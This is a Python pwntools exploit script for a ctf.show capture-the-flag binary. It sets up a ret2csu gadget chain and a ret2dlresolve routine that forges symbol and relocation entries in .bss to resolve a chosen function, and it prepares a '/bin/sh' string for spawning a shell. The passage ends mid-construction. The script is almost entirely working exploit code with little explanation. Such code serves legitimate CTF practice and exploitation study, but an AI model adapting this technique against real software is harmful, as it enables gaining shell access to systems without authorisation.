from pwn import *
context.arch="amd64"
#io = process("./pwn")
io = remote('pwn.challenge.ctf.show',28208)
elf = ELF("./pwn")
bss_addr = elf.bss()
csu_front_addr = 0x400780
csu_end_addr = 0x40079A
vuln_addr = 0x400637
def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += '\x00' * 0x38
    return payload
def ret2dlresolve_x64(elf, store_addr, func_name, resolve_addr):
    plt0 = elf.get_section_by_name('.plt').header.sh_addr
    
    rel_plt = elf.get_section_by_name('.rela.plt').header.sh_addr
    relaent = elf.dynamic_value_by_tag("DT_RELAENT") # reloc entry size
    dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
    syment = elf.dynamic_value_by_tag("DT_SYMENT") # symbol entry size
    dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
    # construct fake function string
    func_string_addr = store_addr
    resolve_data = func_name + "\x00"
    
    # construct fake symbol
    symbol_addr = store_addr+len(resolve_data)
    offset = symbol_addr - dynsym
    pad = syment - offset % syment # align syment size
    symbol_addr = symbol_addr+pad
    symbol = p32(func_string_addr-dynstr)+p8(0x12)+p8(0)+p16(0)+p64(0)+p64(0)
    symbol_index = (symbol_addr - dynsym)/24
    resolve_data +='\x00'*pad
    resolve_data += symbol
    # construct fake reloc 
    reloc_addr = store_addr+len(resolve_data)
    offset = reloc_addr - rel_plt
    pad = relaent - offset % relaent # align relaent size
    reloc_addr +=pad
    reloc_index = (reloc_addr-rel_plt)/24
    rinfo = (symbol_index<<32) | 7
    write_reloc = p64(resolve_addr)+p64(rinfo)+p64(0)
    resolve_data +='\x00'*pad
    resolve_data +=write_reloc
    
    resolve_call = p64(plt0) + p64(reloc_index)
    return resolve_data, resolve_call
    
io.recvuntil('Welcome to CTFshowPWN!\n')
#gdb.attach(io)
store_addr = bss_addr+0x100
sh = "/bin/sh\x00"
# construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section
